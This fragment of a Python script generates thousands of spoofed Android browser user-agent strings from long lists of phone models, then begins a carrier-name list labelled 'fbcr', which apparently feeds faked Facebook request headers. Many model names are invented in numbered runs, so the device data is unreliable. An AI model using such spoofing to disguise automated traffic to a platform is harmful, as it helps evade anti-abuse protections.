            'ASUS_Z01RD',
            'ASUS_Z01QD',
            'ASUS_I01WD',
            'ASUS_I01BD',
            'ASUS_I01HDA'])
        g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h = '124'
        i = '0'
        j = '0'
        k = '0'
        l = 'Mobile Safari/537.36'
        uaku2 = f'''{aa} {b}; {b1}; {c}) {g}{h}.{i}.{j}.{k} {l}'''
        ugen.append(uaku2)
        for alex in range(5000):
            aaa = 'Mozilla/5.0 (Linux; U; Android'
            bb = random.choice([
                '6',
                '7',
                '8',
                '9',
                '10',
                '11',
                '12',
                '13'])
            cc = random.choice([
                'SM-A500F',
                'SM-A500FU',
                'SM-A500H',
                'SM-G532F',
                'SM-G900F',
                'SM-G920F',
                'SM-G930F',
                'SM-G935F',
                'SM-G950F',
                'SM-J320F',
                'SM-J320FN',
                'SM-J320H',
                'SM-J320M',
                'SM-J510FN',
                'SM-J701F',
                'SM-N920S',
                'SM-T111',
                'SM-T230',
                'SM-T231',
                'SM-T235',
                'SM-T280',
                'SM-T311',
                'SM-T315',
                'SM-T525',
                'SM-T531',
                'SM-T535',
                'SM-T555',
                'SM-T561',
                'SM-T705',
                'SM-T805',
                'SM-T820',
                'SPH-L720',
                'SM-S906E',
                'SM-G991',
                'SM-G981',
                'SM-G973',
                'SM-G960',
                'SM-G950',
                'SM-G930',
                'SM-G920',
                'SM-G900',
                'GT-I9500',
                'GT-I9300',
                'GT-I9100',
                'GT-I9000',
                'SM-N981',
                'SM-N970',
                'SM-N960',
                'SM-N950',
                'SM-N920',
                'SM-N910',
                'SM-N900',
                'GT-N7100',
                'GT-N7000',
                'SM-G991',
                'SM-G981',
                'SM-G973',
                'SM-G960',
                'SM-G950',
                'SM-G930',
                'SM-G920',
                'SM-G900',
                'GT-I9500',
                'GT-I9300',
                'GT-I9100',
                'GT-I9000',
                'SM-N981',
                'SM-N970',
                'SM-N960',
                'SM-N950',
                'SM-N920',
                'SM-N910',
                'SM-N900',
                'GT-N7100',
                'GT-N7000',
                'SM-A526B',
                'SM-A516B',
                'SM-A516N',
                'SM-A526U',
                'SM-A716U',
                'SM-A716V',
                'SM-A5260',
                'SM-A526W',
                'SM-A126U',
                'SM-A126V',
                'SM-A016G',
                'SM-A016B',
                'SM-A016M',
                'SM-A025M',
                'SM-A025F',
                'SM-A217F',
                'SM-A217M',
                'SM-A207F',
                'SM-A207M',
                'SM-A102U',
                'SM-A102U1',
                'SM-A102W',
                'SM-A102N',
                'SM-A1020',
                'SM-A105F',
                'SM-A105G',
                'SM-A105M',
                'SM-A202F',
                'SM-A202G',
                'SM-A202M',
                'SM-A125U',
                'SM-A125V',
                'SM-A022G',
                'SM-A022M',
                'SM-A027G',
                'SM-A027M',
                'SM-A2170',
                'SM-A115M',
                'SM-A107M',
                'SM-A107F',
                'SM-A107M',
                'SM-A0220',
                'SM-A115F',
                'SM-A102F',
                'SM-A1050',
                'Infinix X608',
                'Infinix X606B',
                'Infinix X559C',
                'Infinix Zero 3',
                'Infinix X5515F',
                'Infinix Hot 4 Pro',
                'Infinix X510',
                'GT-1015',
                'GT-1020',
                'GT-1030',
                'GT-1035',
                'GT-1040',
                'GT-1045',
                'GT-1050',
                'GT-1240',
                'GT-1440',
                'GT-1450',
                'GT-18190',
                'GT-18262',
                'GT-19060I',
                'GT-19082',
                'GT-19083',
                'GT-19105',
                'GT-19152',
                'GT-19192',
                'GT-19300',
                'GT-19505',
                'GT-2000',
                'GT-20000',
                'GT-200s',
                'GT-3000',
                'GT-414XOP',
                'GT-6918',
                'GT-7010',
                'GT-7020',
                'GT-7030',
                'GT-7040',
                'GT-7050',
                'GT-7100',
                'GT-7105',
                'GT-7110',
                'GT-7205',
                'GT-7210',
                'GT-7240R',
                'GT-7245',
                'GT-7303',
                'GT-7310',
                'GT-7320',
                'GT-7325',
                'GT-7326',
                'GT-7340',
                'GT-7405',
                'GT-7550',
                'GT-8005',
                'GT-8010',
                'GT-81',
                'GT-810',
                'GT-8105',
                'GT-8110',
                'GT-8220S',
                'GT-8410',
                'GT-9300',
                'GT-9320',
                'GT-93G',
                'GT-A7100',
                'GT-A9500',
                'GT-ANDROID',
                'GT-B2710',
                'GT-B5330',
                'GT-B5330B',
                'GT-B5330L',
                'GT-B5330ZKAINU',
                'GT-B5510',
                'GT-B5512',
                'GT-B5722',
                'GT-B7510',
                'GT-B7722',
                'GT-B7810',
                'GT-B9150',
                'GT-B9388',
                'GT-C3010',
                'GT-C3262',
                'GT-C3310R',
                'GT-C3312',
                'GT-C3312R',
                'GT-C3313T',
                'GT-C3322',
                'GT-C3322i',
                'GT-C3520',
                'GT-C3520I',
                'GT-C3592',
                'GT-C3595',
                'GT-C3782',
                'GT-C6712',
                'GT-E1282T',
                'GT-E1500',
                'GT-E2200',
                'GT-E2202',
                'GT-E2250',
                'GT-E2252',
                'GT-E2600',
                'GT-E2652W',
                'GT-E3210',
                'GT-E3309',
                'GT-E3309I',
                'GT-E3309T',
                'GT-G530H',
                'GT-g900f',
                'GT-G930F',
                'GT-H9500',
                'GT-I5508',
                'GT-I5801',
                'GT-I6410',
                'GT-I8150',
                'GT-I8160OKLTPA',
                'GT-I8160ZWLTTT',
                'GT-I8258',
                'GT-I8262D',
                'GT-I8268',
                'GT-I8505',
                'GT-I8530BAABTU',
                'GT-I8530BALCHO',
                'GT-I8530BALTTT',
                'GT-I8550E',
                'GT-i8700',
                'GT-I8750',
                'GT-I900',
                'GT-I9008L',
                'GT-i9040',
                'GT-I9080E',
                'GT-I9082C',
                'GT-I9082EWAINU',
                'GT-I9082i',
                'GT-I9100G',
                'GT-I9100LKLCHT',
                'GT-I9100M',
                'GT-I9100P',
                'GT-I9100T',
                'GT-I9105UANDBT',
                'GT-I9128E',
                'GT-I9128I',
                'GT-I9128V',
                'GT-I9158P',
                'GT-I9158V',
                'GT-I9168I',
                'GT-I9192I',
                'GT-I9195H',
                'GT-I9195L',
                'GT-I9250',
                'GT-I9303I',
                'GT-I9305N',
                'GT-I9308I',
                'GT-I9505G',
                'GT-I9505X',
                'GT-I9507V',
                'GT-I9600',
                'GT-m190',
                'GT-M5650',
                'GT-mini',
                'GT-N5000S',
                'GT-N5100',
                'GT-N5105',
                'GT-N5110',
                'GT-N5120',
                'GT-N7000B',
                'GT-N7005',
                'GT-N7100T',
                'GT-N7102',
                'GT-N7105',
                'GT-N7105T',
                'GT-N7108',
                'GT-N7108D',
                'GT-N8000',
                'GT-N8005',
                'GT-N8010',
                'GT-N8020',
                'GT-N9000',
                'GT-N9505',
                'GT-P1000CWAXSA',
                'GT-P1000M',
                'GT-P1000T',
                'GT-P1010',
                'GT-P3100B',
                'GT-P3105',
                'GT-P3108',
                'GT-P3110',
                'GT-P5100',
                'GT-P5200',
                'GT-P5210XD1',
                'GT-P5220',
                'GT-P6200',
                'GT-P6200L',
                'GT-P6201',
                'GT-P6210',
                'GT-P6211',
                'GT-P6800',
                'GT-P7100',
                'GT-P7300',
                'GT-P7300B',
                'GT-P7310',
                'GT-P7320',
                'GT-P7500D',
                'GT-P7500M',
                'GT-P7500R',
                'GT-P7500V',
                'GT-P7501',
                'GT-P7511',
                'GT-S3330',
                'GT-S3332',
                'GT-S3333',
                'GT-S3370',
                'GT-S3518',
                'GT-S3570',
                'GT-S3600i',
                'GT-S3650',
                'GT-S3653W',
                'GT-S3770K',
                'GT-S3770M',
                'GT-S3800W',
                'GT-S3802',
                'GT-S3850',
                'GT-S5220',
                'GT-S5220R',
                'GT-S5222',
                'GT-S5230',
                'GT-S5230W',
                'GT-S5233T',
                'GT-s5233w',
                'GT-S5250',
                'GT-S5253',
                'GT-s5260',
                'GT-S5280',
                'GT-S5282',
                'GT-S5283B',
                'GT-S5292',
                'GT-S5300',
                'GT-S5300L',
                'GT-S5301',
                'GT-S5301B',
                'GT-S5301L',
                'GT-S5302',
                'GT-S5302B',
                'GT-S5303',
                'GT-S5303B',
                'GT-S5310',
                'GT-S5310B',
                'GT-S5310C',
                'GT-S5310E',
                'GT-S5310G',
                'GT-S5310I',
                'GT-S5310L',
                'GT-S5310M',
                'GT-S5310N',
                'GT-S5312',
                'GT-S5312B',
                'GT-S5312C',
                'GT-S5312L',
                'GT-S5330',
                'GT-S5360',
                'GT-S5360B',
                'GT-S5360L',
                'GT-S5360T',
                'GT-S5363',
                'GT-S5367',
                'GT-S5369',
                'GT-S5380',
                'GT-S5380D',
                'GT-S5500',
                'GT-S5560',
                'GT-S5560i',
                'GT-S5570B',
                'GT-S5570I',
                'GT-S5570L',
                'GT-S5578',
                'GT-S5600',
                'GT-S5603',
                'GT-S5610',
                'GT-S5610K',
                'GT-S5611',
                'GT-S5620',
                'GT-S5670',
                'GT-S5670B',
                'GT-S5670HKBZTA',
                'GT-S5690',
                'GT-S5690R',
                'GT-S5830',
                'GT-S5830D',
                'GT-S5830G',
                'GT-S5830i',
                'GT-S5830L',
                'GT-S5830M',
                'GT-S5830T',
                'GT-S5830V',
                'GT-S5831i',
                'GT-S5838',
                'GT-S5839i',
                'GT-S6010',
                'GT-S6010BBABTU',
                'GT-S6012',
                'GT-S6012B',
                'GT-S6102',
                'GT-S6102B',
                'GT-S6293T',
                'GT-S6310B',
                'GT-S6310ZWAMID',
                'GT-S6312',
                'GT-S6313T',
                'GT-S6352',
                'GT-S6500',
                'GT-S6500D',
                'GT-S6500L',
                'GT-S6790',
                'GT-S6790L',
                'GT-S6790N',
                'GT-S6792L',
                'GT-S6800',
                'GT-S6800HKAXFA',
                'GT-S6802',
                'GT-S6810',
                'GT-S6810B',
                'GT-S6810E',
                'GT-S6810L',
                'GT-S6810M',
                'GT-S6810MBASER',
                'GT-S6810P',
                'GT-S6812',
                'GT-S6812B',
                'GT-S6812C',
                'GT-S6812i',
                'GT-S6818',
                'GT-S6818V',
                'GT-S7230E',
                'GT-S7233E',
                'GT-S7250D',
                'GT-S7262',
                'GT-S7270',
                'GT-S7270L',
                'GT-S7272',
                'GT-S7272C',
                'GT-S7273T',
                'GT-S7278',
                'GT-S7278U',
                'GT-S7390',
                'GT-S7390G',
                'GT-S7390L',
                'GT-S7392',
                'GT-S7392L',
                'GT-S7500',
                'GT-S7500ABABTU',
                'GT-S7500ABADBT',
                'GT-S7500ABTTLP',
                'GT-S7500CWADBT',
                'GT-S7500L',
                'GT-S7500T',
                'GT-S7560',
                'GT-S7560M',
                'GT-S7562',
                'GT-S7562C',
                'GT-S7562i',
                'GT-S7562L',
                'GT-S7566',
                'GT-S7568',
                'GT-S7568I',
                'GT-S7572',
                'GT-S7580E',
                'GT-S7583T',
                'GT-S758X',
                'GT-S7592',
                'GT-S7710',
                'GT-S7710L',
                'GT-S7898',
                'GT-S7898I',
                'GT-S8500',
                'GT-S8530',
                'GT-S8600',
                'GT-STB919',
                'GT-T140',
                'GT-T150',
                'GT-V8a',
                'GT-V8i',
                'GT-VC818',
                'GT-VM919S',
                'GT-W131',
                'GT-W153',
                'GT-X831',
                'GT-X853',
                'GT-X870',
                'GT-X890',
                'GT-Y8750',
                'V2056',
                'V2112A',
                'V2112',
                'V2122A',
                'V2120A',
                'V2120',
                'V2116A',
                'V2114A',
                'V2112A',
                'V2010A',
                'V2019A',
                'V2010',
                'V2003A',
                'V2002A',
                'V2002',
                'V1932A',
                'V1932T',
                'V1932',
                'V1929A',
                'V1928A',
                'V1928T',
                'V1928',
                'V1927A',
                'V1926A',
                'V1925A',
                'V1925',
                'V1924A',
                'V1922A',
                'V1921A',
                'V1921',
                'V1920A',
                'V1919A',
                'V1916A',
                'V1916',
                'V1912A',
                'V1911A',
                'V1910A',
                'V1910',
                'V1909A',
                'V1907A',
                'V1905',
                'V1903A',
                'V1901A',
                'V1901T',
                'V1901',
                'V1836',
                'V1824A',
                'V1824T',
                'V1824',
                'V1818A',
                'V1818T',
                'V1813A',
                'V1813T',
                'V1813',
                'V1812A',
                'V1811A',
                'V1811T',
                'V1811',
                'V1808A',
                'V1808T',
                'V1808',
                'V1801A',
                'V1801T',
                'V1801',
                'V1730T',
                'V1730F',
                'V1730A',
                'V1730',
                'V1724A',
                'V1723A',
                'V1723',
                'V1721A',
                'V1720A',
                'V1720T',
                'V1720',
                'V1716A',
                'V1715A',
                'V1715',
                'V1713A',
                'V1713',
                'V1712A',
                'V1712',
                'V1711T',
                'V1711A',
                'V1711',
                'V1709A',
                'V1709T',
                'V1709',
                'V1708A',
                'V1708T',
                'V1707A',
                'V1707T',
                'V1706T',
                'V1706',
                'V1703A',
                'V1701A',
                'V1701',
                'V1624A',
                'V1623A',
                'V1622A',
                'V1622',
                'V1621A',
                'V1619',
                'V1618A',
                'V1617A',
                'V1616',
                'V1615T',
                'V1614T',
                'V1613',
                'V1611T',
                'V1611',
                'V1608A',
                'V1609',
                'V1605',
                'V1604',
                'V1603',
                'V1601',
                'V1570',
                'V1562',
                'V1561',
                'V1550',
                'V1548',
                'V1546',
                'V1543',
                'V1542',
                'V1540',
                'V1530',
                'V1520',
                'V1510',
                'V1500',
                'V1420',
                'V1400',
                'V1310',
                'V1320',
                'XT2127-2',
                'XT2127-4',
                'XT2127-5',
                'XT2127-6',
                'XT2127-7',
                'XT2127-8',
                'XT2127-10',
                'XT2127-11',
                'XT2127-12',
                'XT2127-13',
                'XT2127-14',
                'XT2127-15',
                'XT2127-16',
                'XT2127-17',
                'XT2127-18',
                'XT2127-19',
                'XT2127-20',
                'XT2127-21',
                'XT2127-22',
                'XT2127-23',
                'XT2127-24',
                'XT2127-25',
                'XT2127-26',
                'XT2127-27',
                'XT2127-28',
                'XT2127-29',
                'XT2127-30',
                'XT2127-31',
                'XT2127-32',
                'XT2127-33',
                'XT2127-34',
                'XT2127-35',
                'XT2127-36',
                'XT2127-37',
                'XT2127-38',
                'XT2127-39',
                'XT2127-40',
                'XT2127-41',
                'XT2127-42',
                'XT2127-43',
                'XT2127-44',
                'XT2127-45',
                'XT2127-46',
                'XT2127-47',
                'XT2127-48',
                'XT2127-49',
                'XT2127-50',
                'XT2127-51',
                'XT2127-52',
                'XT2127-53',
                'XT2127-54',
                'XT2127-55',
                'XT2127-56',
                'XT2127-57',
                'XT2127-58',
                'XT2127-59',
                'XT2127-60',
                'XT2127-61',
                'XT2127-62',
                'XT2127-63',
                'XT2127-64',
                'XT2127-65',
                'XT2127-66',
                'XT2127-67',
                'XT2127-68',
                'XT2127-69',
                'XT2127-70',
                'XT2127-71',
                'XT2127-72',
                'XT2127-73',
                'XT2127-74',
                'XT2127-75',
                'XT2127-76',
                'XT2127-77',
                'XT2127-78',
                'XT2127-79',
                'XT2127-80',
                'XT2127-81',
                'XT2127-82',
                'XT2127-83',
                'XT2127-84',
                'XT2127-85',
                'XT2127-86',
                'XT2127-87',
                'XT2127-88',
                'XT2127-89',
                'XT2127-90',
                'XT2127-91',
                'XT2127-92',
                'XT2127-93',
                'XT2127-94',
                'XT2127-95',
                'XT2127-96',
                'XT2127-97',
                'XT2127-98',
                'XT2127-99',
                'XT2127-100',
                'XT2127-101',
                'XT2127-102',
                'XT2127-103',
                'XT2127-104',
                'XT2127-105',
                'XT2127-106',
                'XT2127-107',
                'XT2127-108',
                'XT2127-109',
                'XT2127-110',
                'XT2127-111',
                'XT2127-112',
                'XT2127-113',
                'XT2127-114',
                'XT2127-115',
                'XT2127-116',
                'XT2127-117',
                'XT2127-118',
                'XT2127-119',
                'XT2127-120',
                'XT2127-121',
                'XT2127-122',
                'XT2127-123',
                'XT2127-124',
                'XT2127-125',
                'XT2127-126',
                'XT2127-127',
                'XT2127-128',
                'XT2127-129',
                'XT2127-130',
                'XT2127-131',
                'XT2127-132',
                'XT2127-133',
                'XT2127-134',
                'XT2127-135',
                'XT2127-136',
                'XT2127-137',
                'XT2127-138',
                'XT2127-139',
                'XT2127-140',
                'XT2127-141',
                'XT2127-142',
                'XT2127-143',
                'XT2127-144',
                'XT2127-145',
                'XT2127-146',
                'XT2127-147',
                'XT2127-148',
                'XT2127-149',
                'XT2127-150',
                'XT2127-151',
                'XT2127-152',
                'XT2127-153',
                'RMX3142',
                'RMX3185',
                'RMX3186',
                'RMX3281',
                'RMX3274',
                'RMX3361',
                'RMX3165',
                'RMX3243',
                'RMX3242',
                'RMX3294',
                'RMX3162',
                'RMX3241',
                'RMX3290',
                'RMX3289',
                'RMX3270',
                'RMX3267',
                'RMX3266',
                'RMX3263',
                'RMX3260',
                'RMX3240',
                'RMX3280',
                'RMX3276',
                'RMX3244',
                'RMX3121',
                'RMX3063',
                'RMX3061',
                'RMX3090',
                'RMX3091',
                'RMX3080',
                'RMX3211',
                'RMX3334',
                'RMX3221',
                'RMX3295',
                'RMX3292',
                'RMX3331',
                'RMX3383',
                'RMX3350',
                'RMX3332',
                'RMX3300',
                'RMX3310',
                'RMX3311',
                'RMX3385',
                'RMX3336',
                'RMX3337',
                'RMX3338',
                'RMX3235',
                'RMX3225',
                'RMX3124',
                'RMX3065',
                'RMX3143',
                'RMX3201',
                'RMX3070',
                'RMX3250',
                'RMX3246',
                'RMX3261',
                'RMX3071',
                'RMX3150',
                'RMX3164',
                'RMX3141',
                'RMX3063',
                'RMX3060',
                'RMX3357',
                'RMX3223',
                'RMX3330',
                'RMX3284',
                'RMX3362',
                'RMX3236',
                'RMX3193',
                'RMX3191',
                'RMX3358',
                'RMX3384',
                'RMX3262',
                'RMX3248',
                'RMX3339',
                'RMX3283',
                'RMX3195',
                'RMX3093',
                'RMX3098',
                'RMX3245',
                'RMX3095',
                'RMX3064',
                'RMX3341',
                'RMX3340',
                'RMX3365',
                'RMX3363',
                'RMX3364',
                'RMX3366',
                'RMX3367',
                'RMX3368',
                'RMX3369',
                'RMX3370',
                'RMX3371',
                'RMX3372',
                'RMX3373',
                'RMX3374',
                'RMX3375',
                'RMX3376',
                'RMX3377',
                'RMX3378',
                'RMX3379',
                'RMX3380',
                'RMX3381',
                'RMX3382',
                'RMX3312',
                'RMX3249',
                'RMX3094',
                'RMX3116',
                'RMX3187',
                'RMX3096',
                'RMX3097',
                'RMX3171',
                'RMX3152',
                'RMX3115',
                'RMX3081',
                'RMX3272',
                'RMX3273',
                'RMX3264',
                'RMX3265',
                'RMX3269',
                'RMX3268',
                'RMX3082',
                'RMX3083',
                'RMX3084',
                'RMX3085',
                'RMX3086',
                'RMX3087',
                'RMX3088',
                'RMX3089',
                'RMX3099',
                'RMX309A',
                'RMX309B',
                'RMX309C',
                'RMX309D',
                'RMX309E',
                'RMX309F',
                'RMX309G',
                'RMX309H',
                'RMX309I',
                'RMX309J',
                'RMX309K',
                'RMX309L',
                'RMX309M',
                'RMX309N',
                'RMX309O',
                'RMX309P',
                'RMX309Q',
                'RMX309R',
                'RMX309S',
                'RMX309T',
                'RMX309U',
                'RMX309V',
                'RMX309W',
                'RMX309X',
                'RMX309Y',
                'RMX309Z',
                'RMX31ZM',
                'RMX31ZN',
                'RMX31ZS',
                'RMX31ZT',
                'RMX31ZW',
                'RMX31ZV',
                'RMX31ZR',
                'RMX31ZQ',
                'RMX31ZP',
                'RMX31ZO',
                'RMX31ZN',
                'RMX31ZM',
                'RMX31ZL',
                'RMX31ZK',
                'RMX31ZJ',
                'RMX31ZI',
                'RMX31ZH',
                'RMX31ZG',
                'RMX31ZF',
                'RMX31ZE',
                'RMX31ZD',
                'RMX31ZC',
                'CPH1903',
                'CPH1803',
                'CPH1859',
                'CPH1969',
                'CPH1989',
                'CPH1919',
                'CPH1941',
                'CPH1983',
                'CPH1963',
                'CPH1879',
                'CPH1831',
                'CPH2035',
                'CPH2069',
                'CPH1987',
                'CPH2071',
                'CPH2083',
                'CPH2015',
                'CPH2019',
                'CPH2173',
                'CPH2089',
                'CPH2067',
                'CPH2017',
                'CPH2087',
                'CPH2205',
                'CPH2251',
                'CPH2197',
                'CPH2235',
                'CPH2347',
                'CPH2295',
                'CPH2249',
                'CPH2243',
                'CPH2349',
                'CPH2359',
                'CPH2383',
                'CPH2381',
                'CPH2239',
                'CPH2213',
                'CPH2129',
                'CPH2195',
                'CPH2227',
                'CPH2316',
                'CPH2353',
                'CPH2261',
                'CPH2225',
                'CPH2269',
                'CPH2073',
                'CPH2185',
                'CPH1877',
                'CPH2013',
                'CPH2061',
                'CPH1955',
                'CPH1871',
                'CPH1801',
                'CPH1873',
                'CPH1901',
                'CPH1809',
                'CPH1853',
                'CPH1923',
                'CPH1981',
                'CPH1833',
                'CPH1917',
                'CPH1967',
                'CPH1937',
                'CPH1893',
                'CPH1931',
                'CPH1921',
                'CPH1823',
                'CPH2023',
                'CPH2021',
                'CPH2103',
                'CPH2220',
                'CPH2127',
                'CPH2059',
                'CPH2139',
                'CPH2253',
                'CPH2267',
                'CPH2263',
                'CPH2247',
                'CPH2241',
                'CPH2297',
                'CPH2357',
                'CPH2255',
                'CPH2345',
                'CPH2329',
                'CPH2209',
                'CPH2191',
                'CPH2199',
                'CPH2289',
                'CPH2319',
                'CPH2343',
                'CPH2363',
                'CPH2161',
                'CPH2163',
                'CPH1979',
                'CPH1977',
                'CPH1973',
                'CPH1965',
                'CPH1959',
                'CPH1951',
                'CPH1913',
                'CPH1909',
                'CPH1905',
                'CPH1861',
                'CPH1863',
                'CPH1967',
                'CPH1933',
                'CPH1937',
                'CPH1921',
                'CPH1923',
                'CPH1987',
                'CPH1919',
                'CPH1897',
                'CPH1875',
                'CPH1874',
                'CPH1872',
                'CPH1865',
                'CPH1863',
                'CPH1862',
                'CPH1853',
                'CPH1852',
                'CPH1851',
                'CPH1843',
                'CPH1841',
                'CPH1835',
                'CPH1833',
                'CPH1832',
                'CPH1831',
                'CPH1825',
                'CPH1823',
                'CPH1821',
                'CPH1819',
                'CPH1813',
                'CPH1812',
                'CPH1811',
                'CPH1809',
                'CPH1808',
                'CPH1807',
                'CPH1805',
                'CPH1803',
                'CPH1801',
                'Meizu 18s',
                'Meizu 18',
                'Meizu 17 Pro',
                'Meizu 17',
                'Meizu 16s Pro',
                'Meizu 16s',
                'Meizu 16T',
                'Meizu 16Xs',
                'Meizu 16X',
                'Meizu 16th Plus',
                'Meizu 16th',
                'Meizu 15 Plus',
                'Meizu 15',
                'Meizu 15 Lite',
                'Meizu 16s Plus',
                'Meizu 16',
                'Meizu 16 Max',
                'Meizu 16 Note',
                'Meizu 16s Plus',
                'Meizu 16',
                'Meizu 16X',
                'Meizu 16th Plus',
                'Meizu 16th',
                'Meizu 15 Plus',
                'Meizu 15',
                'Meizu 15 Lite',
                'Meizu M6T',
                'Meizu M6s',
                'Meizu M6 Note',
                'Meizu M6',
                'Meizu M5c',
                'Meizu M5s',
                'Meizu M5 Note',
                'Meizu M5',
                'Meizu M5c',
                'Meizu M5s',
                'Meizu M5 Note',
                'Meizu M5',
                'Meizu M5c',
                'Meizu M5s',
                'Meizu M5 Note',
                'Meizu M5',
                'Meizu M5c',
                'Meizu M5s',
                'Meizu M5 Note',
                'Meizu M5',
                'S41',
                'S31',
                'S21',
                'S12',
                'S11',
                'A56',
                'A55',
                'A54',
                'A23',
                'A16',
                'A15',
                'P36 Pro',
                'P36',
                'P33 Plus',
                'P33',
                'P32',
                'P31',
                'A88',
                'A47',
                'A46',
                'A45',
                'A44',
                'A41 Plus',
                'A41',
                'A25 Pro',
                'A25',
                'A23 Pro',
                'A22 Pro',
                'A22',
                'A21',
                'A16 Plus',
                'A16S',
                'A16',
                'A14',
                'A13 Plus',
                'A13',
                'A11',
                'A10',
                'Vision 1 Plus',
                'Vision 1',
                'S13 Pro',
                'S13',
                'S12 Lite',
                'S11 Lite',
                'S11 Pro',
                'S11 Plus',
                'S10',
                'S15',
                'S14',
                'S13P',
                'S12',
                'S11',
                'S10',
                'S15',
                'S14',
                'S13P',
                'S12',
                'S11',
                'S10',
                'S15',
                'S14',
                'S13P',
                'S12',
                'S11',
                'S10',
                'Camon 16 Premier',
                'Camon 16 Pro',
                'Camon 16',
                'Camon 15 Premier',
                'Camon 15 Pro',
                'Camon 15',
                'Spark 6',
                'Spark 5 Pro',
                'Spark 5',
                'Pova',
                'Pouvoir 4 Pro',
                'Pouvoir 4',
                'Phantom 9',
                'Phantom X',
                'Camon 12 Pro',
                'Camon 12',
                'Camon 11',
                'Camon 11 Pro',
                'Camon 11S',
                'Spark 4',
                'Spark 4 Air',
                'Spark 3 Pro',
                'Spark 3',
                'Spark 2',
                'Pouvoir 3 Plus',
                'Pouvoir 3',
                'Phantom 8',
                'Phantom 6',
                'Phantom 6 Plus',
                'Camon X Pro',
                'Camon X',
                'Camon CM',
                'Camon CX Air',
                'Camon CX',
                'Spark Plus K9',
                'Spark K7',
                'Spark Plus K9',
                'Spark K7 Plus',
                'Boom J8',
                'Boom J7',
                'Boom J5',
                'Boom J9 Plus',
                'Boom J10',
                'Pop 3',
                'Pop 2 Plus',
                'Pop 2 Power',
                'Pop 2F',
                'Pop 1',
                'F1',
                'F2',
                'F3',
                'F4',
                'F5',
                'Xperia 1',
                'Xperia 5',
                'Xperia 10',
                'Xperia L4',
                'Xperia XZ3',
                'Xperia XZ2',
                'Xperia XZ1',
                'Xperia XA2',
                'Xperia XA1',
                'Xperia XZs',
                'Xperia XZ',
                'Xperia X Compact',
                'Xperia XA Ultra',
                'Xperia XA',
                'Xperia X Performance',
                'Xperia XA1 Ultra',
                'Xperia XA2 Ultra',
                'Xperia XZ2 Premium',
                'Xperia XZ2 Compact',
                'Xperia 10 Plus',
                'Xperia L3',
                'Xperia 1 II',
                'Xperia 5 II',
                'Xperia 10 II',
                'Xperia 10 III',
                'Xperia L5',
                'Xperia XZ4',
                'Xperia XZ4 Compact',
                'Xperia XZ Premium',
                'Xperia XZ1 Compact',
                'Xperia XA3',
                'Xperia XA4',
                'Xperia XA5',
                'Xperia XA6',
                'Xperia XA7',
                'Xperia XA8',
                'Xperia XA9',
                'Xperia XA10',
                'Xperia XA11',
                'Xperia XA12',
                'Xperia XA13',
                'Xperia XA14',
                'Xperia XA15',
                'Xperia XA16',
                'Xperia XA17',
                'Xperia XA18',
                'Xperia XA19',
                'Xperia XA20',
                'Xperia XA21',
                'Xperia XA22',
                'Xperia XA23',
                'Xperia XA24',
                'Xperia XA25',
                'Xperia XA26',
                'Xperia XA27',
                'Xperia XA28',
                'Xperia XA29',
                'Xperia XA30',
                'Xperia XA31',
                'Xperia XA32',
                'Xperia XA33',
                'Xperia XA34',
                'Xperia XA35',
                'Xperia XA36',
                'Xperia XA37',
                'Xperia XA38',
                'Xperia XA39',
                'Xperia XA40',
                'Xperia XA41',
                'Xperia XA42',
                'ZenFone 8',
                'ROG Phone 5',
                'ZenFone 7',
                'ROG Phone 3',
                'ZenFone 6',
                'ROG Phone II',
                'ZenFone 5Z',
                'ZenFone 5',
                'ZenFone 4 Pro',
                'ZenFone 4',
                'ZenFone 3 Deluxe',
                'ZenFone 3',
                'ZenFone 2 Laser',
                'ZenFone 2',
                'ZenFone',
                'ZenFone 6Z',
                'ZenFone Max Pro (M2)',
                'ZenFone Max Pro (M1)',
                'ZenFone 6Z',
                'ZenFone Max Plus (M2)',
                'ZenFone Max (M2)',
                'ZenFone Max (M1)',
                'ZenFone Live',
                'ZenFone Zoom',
                'ZenFone Selfie',
                'ASUS_Z01RD',
                'ASUS_Z01QD',
                'ASUS_I01WD',
                'ASUS_I01BD',
                'ASUS_I01HDA'])
            gg = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
            hh = '124'
            ii = '0'
            jj = '0'
            kk = '0'
            ll = 'Mobile Safari/537.36'
            uaku3 = f'''{aaa} {bb}; {cc}) {gg}{hh}.{ii}.{jj}.{kk} {ll}'''
            useragent.append(uaku3)
            fbcr_values = [
                'AT&T',
                'Orange',
                'Telia',
                'Vodafone',
                'Sky Mobile',
                'Proximus',
                'Movistar',
                'Tele2',
                'Telekom',
                'Eir',
                'KPN',
                'Three',
                'China Mobile',
                'NTT',
                'KT Corporation',
                'Singtel',
                'AIS',
                'Viettel',
                'Smart',
                'PTCL',
                'Grameenphone',
                'MTN',
                'T-Mobile',
                'Verizon',
                'Rogers',
                'O2',
                'Telstra',
                'TIM',
                'Vivo',
                'Telenor',
                'Mobilink',
                'Bell',
                'Etisalat',
                'Claro',
                'Telkomsel',
                'Beeline',
                'MTS',
                'Optus',
                'SK Telecom',
                'Entel',
                'Tigo',
                'Idea',
                'DTAC',
                'Zong',
                'EE',
                'Digi',
                'Koodo',
                'Yoigo',
                'Airtel',
                'Cosmote',
                'Digicel',
                'LIME',
                'Telus',
                'Sprint',
                'Ncell',
                'Telenor',
                'MEO',
                'Telkom',
                'Giffgaff',
                'Lycamobile',
                'A1 Telekom',
                'Vivacom',
                'M1',
                'DT Mobile',
                'Rakuten Mobile',
                'Ooredoo',
                'NOS',
                'Three',
                'NetOne',
                'Glo',
                'Cell C',
                'Maxis',
                'Fido',
                'Zain',
                'Jazz Pakistan',
                'Robi',
                'TIM',
                'Jio',
                'Bouygues Telecom',
                'Entel ',
                'Ncell',
                'Djezzy',
                'Safaricom',
                'Elisa',
                'Tata Docomo',
                'Smartfren',
                'Axiata',
                'Moldcell',
                'Bell Mobility',
                'DNA',
                'VIPnet',
                'TrueMove',
                'XL Axiata',
                'Dialog',
                'Viva',
                'Wind',
                'Maroc Telecom',
                'Sun',
                'DITO',
                'Globe',
                'GOMO',
                'TNT',
                'TM',
                'Unitel',
                'MobiFone',
                'TMN',
                'Globacom',
                'Roshan',
                'Afghan',
                'Wasel',
                'Vodafone ALBtelecom',
                'Mobilis',
                'Blue Sky',
                'Andorra',
                'Movicel',
                'FLOW',
                'Weblinks',
                'APUA',
                'Personal',
                'Nextel',
                'Tuenti',
                'Nuestro',
                'Ucom',
                'MIO',
                'SetarNV',
                '3',
                'Azercell',
                'Bakcell',
                'Nar',
                'Aztrank',
                'Nakhtel',
                'BTC',
                'Batelco',
                'Robi',
